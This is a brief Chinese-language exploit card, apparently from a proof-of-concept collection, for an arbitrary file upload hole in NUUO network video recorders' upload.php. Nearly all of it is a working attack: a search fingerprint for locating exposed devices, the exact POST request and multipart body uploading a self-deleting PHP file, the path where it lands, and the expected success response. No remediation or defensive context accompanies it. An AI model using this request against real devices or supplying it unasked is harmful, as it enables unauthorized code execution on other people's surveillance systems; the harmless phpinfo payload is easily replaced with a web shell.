# NUUO摄像头upload.php存在任意文件上传漏洞

- **系统**：NUUO　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="Network Video Recorder Login"`
- **请求**：`POST /upload.php HTTP/1.1`
- **关键头**：`Content-Length: 155`　`Content-Type: multipart/form-data; boundary=--------ok4o88lom`

**请求体 / payload**
```
----------ok4o88lom
Content-Disposition: form-data; name="userfile"; filename="9pqs9.php"
<?php phpinfo();@unlink(__FILE__);?>
----------ok4o88lom--
上传定位:/9pqs9.php
```
- **预期**：200　|　—